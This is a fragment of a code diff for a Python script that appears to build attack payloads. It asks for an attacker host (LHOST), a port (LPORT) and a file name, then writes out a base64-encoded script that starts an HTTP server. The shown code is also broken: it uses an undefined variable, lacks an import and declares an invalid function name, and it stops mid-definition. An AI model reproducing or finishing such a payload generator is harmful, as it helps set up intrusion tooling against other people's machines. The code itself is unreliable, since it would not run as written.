@@ -1,11 +1,12 @@
 import os, time
 
+os.chdir("../output/")
 time.sleep(0.5)
 opt = input("LHOST: ")
 opt2 = input("LPORT: ")
 opt3 = input("name: ")
 op = open(name + ".py", "w")
-cod = base64.b64encode("""import os, time
+cod = base64.b64encode(b"""import os, time
 
 os.system("python3 -m http.server 8080 &")
 def get-put(ip):
